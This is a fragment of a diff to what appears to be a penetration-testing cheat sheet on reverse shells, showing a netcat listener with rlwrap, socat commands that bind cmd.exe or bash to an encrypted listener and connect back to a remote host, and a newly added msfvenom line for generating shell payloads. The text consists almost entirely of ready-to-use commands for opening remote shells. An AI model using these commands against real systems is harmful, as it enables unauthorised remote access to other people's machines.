@@ -7,6 +7,7 @@ REVERSE SHELL LISTS/GENERATORS
 
 ______________________________________________________________________________________
 SHELLS AND STABILIZING METHODS
+
   rlwrap method:
     rlwrap nc -lvnp <PORT>
 
@@ -51,6 +52,10 @@ SHELLS AND STABILIZING METHODS
     windows listener: socat OPENSSL-LISTEN:[RPORT],cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
     linux listener:   socat OPENSSL-LISTEN:[RPORT],cert=shell.pem,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
     connect back:     socat OPENSSL:[RHOST]:[RPORT],verify=0 FILE:`tty`,raw,echo=0
+
+  generating msfvenom shells
+                           /shell_stageless_payload
+    msfvenom -p [OS]/[ARCH]/shell/staged_payload -f [exe/elf] -o [OUTFILE] LHOST=[LHOST] LPORT=[LPORT]
     
 ______________________________________________________________________________________
 CHANGE TERMINAL SIZE
